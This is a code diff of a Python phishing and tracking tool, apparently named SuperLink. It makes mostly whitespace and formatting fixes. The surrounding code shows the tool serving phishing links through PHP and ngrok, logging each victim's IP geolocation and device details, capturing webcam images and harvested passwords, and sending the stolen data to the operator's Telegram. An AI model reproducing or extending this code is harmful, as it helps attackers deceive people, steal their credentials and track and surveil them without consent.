@@ -24,8 +24,8 @@ def check_dependency():
             exit()
     does_php_exist = which('php')
     if does_php_exist is None:
-            tprint.out(f" [!] 'php' is not installed!")
-            exit()
+        tprint.out(f" [!] 'php' is not installed!")
+        exit()
     else:
         pass
 
@@ -87,8 +87,8 @@ def check_py_version():
         exit()
     else:
         pass
-    
-    
+
+
 def win10notif(
         title: str,
         msg: str,
@@ -256,7 +256,7 @@ def start():
                 _del_.deleteAllFilesByType("png", "./Target-Data")
                 _del_.deleteAllFilesByType("png", "./Webcam-Images")
                 tprint.out(LG + " [>] Targets files deleted successfully! ")
-                win10notif("Files deleted!", 
+                win10notif("Files deleted!",
                            "All of the targets files (TXT & IMG) have been successfully deleted!",
                            icon=icons_path + "trash_empty.ico")
                 press_enter()
@@ -288,7 +288,7 @@ def check_updates():
     tprint.out(LG + " [>] Checking for new update...")
     if updater.checkForUpdates is False:
         tprint.out(LG + " [>] Everything is up-to-date!")
-        win10notif("Up-To-Date!", 
+        win10notif("Up-To-Date!",
                    "Everything has been checked and there is not any new update!",
                    icon="./Modules/icons/green_check.ico")
     elif updater.checkForUpdates is None:
@@ -298,13 +298,13 @@ def check_updates():
                    icon="./Modules/icons/red_cross.ico")
     else:
         tprint.out(LY + f" [!] There is a new update available! (" +
-                   LR + f"v{updater.checkForUpdates}" + LY+ ")")
+                   LR + f"v{updater.checkForUpdates}" + LY + ")")
         win10notif("New update available!",
                    f"A new update realesed on github by the author (IHosseini)\nnew version: {updater.checkForUpdates}",
                    icon="./Modules/icons/exclamation_mark.ico")
         up_file = f"SuperLink-v{updater.checkForUpdates}.zip"
-        select_down = input("\n\n" + LG + " [" + LR + "?" + LG + "]" + 
-                            LB + f" Do you want to download the new version ({updater.checkForUpdates}) ? [y/n] " + 
+        select_down = input("\n\n" + LG + " [" + LR + "?" + LG + "]" +
+                            LB + f" Do you want to download the new version ({updater.checkForUpdates}) ? [y/n] " +
                             LW + "").lower()
         if select_down == "y" or select_down == "yes":
             banner()
@@ -315,12 +315,12 @@ def check_updates():
                 tprint.out(LG + f" [>] Downloaded successfully!")
                 win10notif("Update files downloaded!",
                            "New update files successfully downloaded and gonna be extracted soon!",
-                           icon="./Modules/icons/download_folder.ico")                
+                           icon="./Modules/icons/download_folder.ico")
                 tprint.out(LG + f" [>] Extracting new update file ({up_file})...")
                 sleep(2)
                 up_downloader.extract(f"../{up_file}", path=f"../{up_file}".replace(".zip", ""))
-                tprint.out(LG + f" [>] Update file successfully extractrd in " + 
-                        LW + f"[../{up_file}]".replace(".zip", ""))
+                tprint.out(LG + f" [>] Update file successfully extractrd in " +
+                           LW + f"[../{up_file}]".replace(".zip", ""))
             except Exception as error:
                 tprint.out(LR + f" [>] Something went wrong while updating!")
             press_enter()
@@ -394,7 +394,7 @@ class MainServer:
                 self.tprint.out(LG + " [>] Sending the link to your" + LW + " telegram" + LG + " ... ")
                 try:
                     self.telebot.sendMessage(
-                        f"✅ New link created!\n\n🌐 Template name : {template_name}\n🔗 Link : {link}" + 
+                        f"✅ New link created!\n\n🌐 Template name : {template_name}\n🔗 Link : {link}" +
                         f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
                     self.tprint.out(
                         LG + " [>] The link have been sent to your " + LW + "telegram" + LG + " successfully!\n")
@@ -411,13 +411,13 @@ class MainServer:
                 print("\n\n" + LY + " [!] Something went wrong while creating the link!\n")
             else:
                 print("\n\n" + LR + " [#MainServer] ERROR : " + str(error))
-            self.telebot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" + 
+            self.telebot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" +
                                      f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
             press_enter()
             self.kill_php()
             ngrok.kill()
         except KeyboardInterrupt:
-            self.telebot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" + 
+            self.telebot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" +
                                      f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
             self.kill_php()
 
@@ -457,7 +457,7 @@ class MainServer:
             try:
                 TARGET_IP = self.get_ip_addr()
                 if TARGET_IP is not None:
-                    win10notif("Target detected!", 
+                    win10notif("Target detected!",
                                "New target opened the link!",
                                icons_path + "devilish_earth.ico")
                     target_data_file = f"./Target-Data/{self.time_opt.calendar}_T{number_of_target}.txt"
@@ -482,7 +482,7 @@ class MainServer:
                         with open(target_data_file, "w") as target_info:
                             target_info.write(full_target_data)
                         tprint.out(LG + f" [>] Target GeoIP data successfully saved in" +
-                                   LW + f" [{target_data_file}]" + LG + " &" + 
+                                   LW + f" [{target_data_file}]" + LG + " &" +
                                    LW + f" [./Target-Data/IMG_T{number_of_target}.png]")
                         print("")
                     else:
@@ -491,7 +491,7 @@ class MainServer:
                     if self.template_path == temp_path_li[3]:
                         print(LG + " [>] New images will be available in " + LW + "[./Webcam-Images]")
                     elif self.template_path == temp_path_li[-2]:
-                        print(LG + " [>] If you catch any passwords, they will be in " + 
+                        print(LG + " [>] If you catch any passwords, they will be in " +
                               LW + f"[./Target-Data/{self.time_opt.calendar}_PASSWDS.txt]")
                     elif self.template_path == temp_path_li[-1]:
                         if stat(file_path_loc).st_size != 0:
@@ -526,15 +526,15 @@ class MainServer:
                         tprint.out(LG + " [>] Sending target data to your" + LW + " telegram" + LG + " ...")
                         with open(target_data_file, "r") as data:
                             imagedata = Data2Image(f"./Target-Data/IMG_T{number_of_target}.png")
-                            imagedata.write_image(data.read().replace("------", ""), "./Modules/fonts/arial.ttf", 
-                                                  25, "RGB", (1024, 1024), (250, 97, 97), 
+                            imagedata.write_image(data.read().replace("------", ""), "./Modules/fonts/arial.ttf",
+                                                  25, "RGB", (1024, 1024), (250, 97, 97),
                                                   (255, 255, 255))
-                            self.telebot.sendDocument(target_data_file, 
+                            self.telebot.sendDocument(target_data_file,
                                                       caption=f"*Target Number* `{number_of_target}`\n" +
-                                                      f"*Template name* : `{template_name}`\n" 
-                                                      f"*Time* : {self.time_opt.calendar} {self.time_opt.clock}", 
+                                                              f"*Template name* : `{template_name}`\n"
+                                                              f"*Time* : {self.time_opt.calendar} {self.time_opt.clock}",
                                                       parse_mode="Markdown")
-                        tprint.out(LG + " [>] Data file successfully sent to your" + LW + " telegram"+ LG + " !")
+                        tprint.out(LG + " [>] Data file successfully sent to your" + LW + " telegram" + LG + " !")
                         print("")
                     except:
                         tprint.out(LR + " [>]" + LY + " Faild to send the target data to your " +
@@ -553,22 +553,22 @@ class MainServer:
                 print("\n\n" + LR + " [#getUserData] ERROR : " + str(error))
                 exit()
 
-    
+
 def implement_userdata(info_data: dict, ip_data: dict):
     full_target_data = "[------ GeolocationIP Info ------] \n\n" \
-                        f"-> IP : {ip_data['ip']}\n-> City : {ip_data['city']}\n" \
-                        f"-> Region : {ip_data['region']}\n-> Country : {ip_data['country']}\n" \
-                        f"-> Location : {ip_data['location']}\n-> ISP : {ip_data['isp']}\n" \
-                        f"-> Post Code : {ip_data['postal']}\n-> Time Zone : {ip_data['time_zone']}\n" \
-                        "\n[------ System Info ------] \n\n" \
-                        f"-> OS Name : {info_data['OS-Name']}\n-> OS Version : {info_data['OS-Version']}\n" \
-                        f"-> Browser : {info_data['Browser-Name']} {info_data['Browser-Version']}\n" \
-                        f"-> Device : {info_data['Device-Name']}\n-> Device-Memory : {info_data['Device-Memory']}\n"\
-                        f"-> CPU Architecture : {info_data['CPU-Architecture']}\n" \
-                        f"-> Number Of CPU Cores : {info_data['CPU-Cores']}\n" \
-                        f"-> Screen Resolution : {info_data['Device-Resolution']}\n" \
-                        f"-> Time Zone : {info_data['Time-Zone']}\n-> Language : {info_data['User-Language']}\n" \
-                        f"-> User-Agent : {info_data['User-Agent']}"
+                       f"-> IP : {ip_data['ip']}\n-> City : {ip_data['city']}\n" \
+                       f"-> Region : {ip_data['region']}\n-> Country : {ip_data['country']}\n" \
+                       f"-> Location : {ip_data['location']}\n-> ISP : {ip_data['isp']}\n" \
+                       f"-> Post Code : {ip_data['postal']}\n-> Time Zone : {ip_data['time_zone']}\n" \
+                       "\n[------ System Info ------] \n\n" \
+                       f"-> OS Name : {info_data['OS-Name']}\n-> OS Version : {info_data['OS-Version']}\n" \
+                       f"-> Browser : {info_data['Browser-Name']} {info_data['Browser-Version']}\n" \
+                       f"-> Device : {info_data['Device-Name']}\n-> Device-Memory : {info_data['Device-Memory']}\n" \
+                       f"-> CPU Architecture : {info_data['CPU-Architecture']}\n" \
+                       f"-> Number Of CPU Cores : {info_data['CPU-Cores']}\n" \
+                       f"-> Screen Resolution : {info_data['Device-Resolution']}\n" \
+                       f"-> Time Zone : {info_data['Time-Zone']}\n-> Language : {info_data['User-Language']}\n" \
+                       f"-> User-Agent : {info_data['User-Agent']}"
     return full_target_data
 
 
